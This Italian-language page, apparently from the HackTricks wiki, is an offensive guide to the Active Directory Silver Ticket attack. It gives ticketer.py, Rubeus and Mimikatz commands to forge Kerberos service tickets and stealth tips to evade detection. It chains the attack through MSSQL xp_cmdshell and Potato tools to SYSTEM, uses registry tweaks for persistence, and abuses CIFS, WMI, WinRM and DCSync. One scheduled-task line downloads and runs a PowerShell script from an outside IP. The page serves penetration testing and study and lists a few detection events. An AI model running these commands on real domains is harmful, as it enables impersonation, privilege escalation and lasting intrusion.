# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L'attacco **Silver Ticket** consiste nello sfruttamento dei service ticket negli ambienti Active Directory (AD). Questo metodo si basa sull'**acquisizione dell'hash NTLM di un service account**, come un computer account, per falsificare un Ticket Granting Service (TGS) ticket. Con questo ticket falsificato, un attacker può accedere a servizi specifici sulla rete, **impersonando qualsiasi utente**, con l'obiettivo tipico di ottenere privilegi amministrativi. È importante sottolineare che l'uso delle chiavi AES per falsificare i ticket è più sicuro e meno rilevabile.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> I Silver Ticket sono meno rilevabili dei Golden Ticket perché richiedono solo l'**hash del service account**, non quello dell'account krbtgt. Tuttavia, sono limitati al servizio specifico preso di mira. Inoltre, è sufficiente rubare la password di un utente.
Inoltre, se comprometti la **password di un account con un SPN**, puoi usare quella password per creare un Silver Ticket impersonando qualsiasi utente verso quel servizio.

### Modifiche moderne a Kerberos (domini solo-AES)

- Gli aggiornamenti di Windows a partire dall'**8 novembre 2022 (KB5021131)** impostano i service ticket su **chiavi di sessione AES** quando possibile e stanno eliminando gradualmente RC4. I DC dovrebbero essere distribuiti con RC4 **disabilitato per impostazione predefinita entro la metà del 2026**, quindi l'utilizzo di hash NTLM/RC4 per i Silver Ticket fallisce sempre più spesso con `KRB_AP_ERR_MODIFIED`. Estrai sempre le **chiavi AES** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) per il service account di destinazione.<sup>[[5]](#references)</sup>
- Se `msDS-SupportedEncryptionTypes` del service account è limitato ad AES, devi eseguire il forging con `/aes256` o `-aesKey`; RC4 (`/rc4` o `-nthash`) non funzionerà anche se possiedi l'hash NTLM.<sup>[[6]](#references)</sup>
- Gli account gMSA/computer ruotano ogni 30 giorni; esegui il dump della **chiave AES corrente** da LSASS, Secretsdump/NTDS o DCsync prima del forging.
- OPSEC: la durata predefinita dei ticket negli strumenti è spesso di **10 anni**; imposta durate realistiche (ad esempio `-duration 600` minuti) per evitare il rilevamento dovuto a durate anomale.<sup>[[6]](#references)</sup>

Per la creazione dei ticket vengono utilizzati strumenti diversi in base al sistema operativo:

### Su Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Su Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Il servizio CIFS è evidenziato come un target comune per accedere al file system della vittima, ma anche altri servizi come HOST e RPCSS possono essere sfruttati per eseguire task e query WMI.

### Esempio: servizio MSSQL (MSSQLSvc) + Potato per ottenere SYSTEM

Se disponi dell'hash NTLM (o della chiave AES) di un account di servizio SQL (ad esempio, sqlsvc), puoi forgiare un TGS per lo SPN MSSQL e impersonare qualsiasi utente presso il servizio SQL. Da lì, abilita xp_cmdshell per eseguire comandi con l'account del servizio SQL. Se quel token dispone di SeImpersonatePrivilege, concatena un Potato per elevare i privilegi a SYSTEM.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Se il contesto risultante dispone di SeImpersonatePrivilege (spesso è così per gli account di servizio), usa una variante di Potato per ottenere SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Ulteriori dettagli sull'abuso di MSSQL e sull'abilitazione di xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Panoramica delle tecniche Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Servizi disponibili

| Tipo di servizio                          | Silver Tickets del servizio                                                |
| ----------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                       | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                       | <p>HOST</p><p>HTTP</p><p>A seconda dell'OS anche:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                     | <p>HOST</p><p>HTTP</p><p>In alcuni casi è sufficiente richiedere: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, anche psexec           | CIFS                                                                       |
| Operazioni LDAP, incluso DCSync            | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus** puoi **richiedere tutti** questi ticket usando il parametro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event ID dei Silver tickets

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- **L'assenza di un precedente 4768/4769 sul DC** per lo stesso client/servizio è un indicatore comune della presentazione diretta al servizio di un TGS forgiato.
- Una durata del ticket insolitamente lunga o un tipo di crittografia imprevisto (RC4 quando il dominio impone AES) risaltano anch'essi nei dati 4769/4624.

## Persistenza

Per evitare che le macchine cambino automaticamente la propria password ogni 30 giorni, imposta `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`, oppure puoi impostare `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` su un valore superiore a 30 giorni per indicare il periodo dopo il quale la password delle macchine deve essere cambiata.<sup>[[3]](#references)</sup>

## Abuso dei Service tickets

Negli esempi seguenti immaginiamo che il ticket venga recuperato impersonando l'account administrator.

### CIFS

Con questo ticket potrai accedere alle cartelle `C$` e `ADMIN$` tramite **SMB** (se sono esposte) e copiare file in una parte del filesystem remoto semplicemente facendo qualcosa come:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Potrai anche ottenere una shell all'interno dell'host o eseguire comandi arbitrari utilizzando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con questo permesso puoi generare attività pianificate nei computer remoti ed eseguire comandi arbitrari:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con questi ticket puoi **eseguire WMI nel sistema della vittima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trova **maggiori informazioni su wmiexec** nella seguente pagina:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con l'accesso winrm a un computer puoi **accedervi** e persino ottenere una PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulta la seguente pagina per scoprire **altri modi per connetterti a un host remoto usando winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Nota che **winrm deve essere attivo e in ascolto** sul computer remoto per potervi accedere.

### LDAP

Con questo privilegio puoi eseguire il dump del database del DC usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Scopri di più su DCSync** nella seguente pagina:


{{#ref}}
dcsync.md
{{#endref}}


## Riferimenti

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Come attaccare Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Processo della password dell'account computer - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: percorso Silver Ticket + Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: hardening di Kerberos e deprecazione di RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Opzioni attuali di Impacket ticketer.py (AES/keytab/durata)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
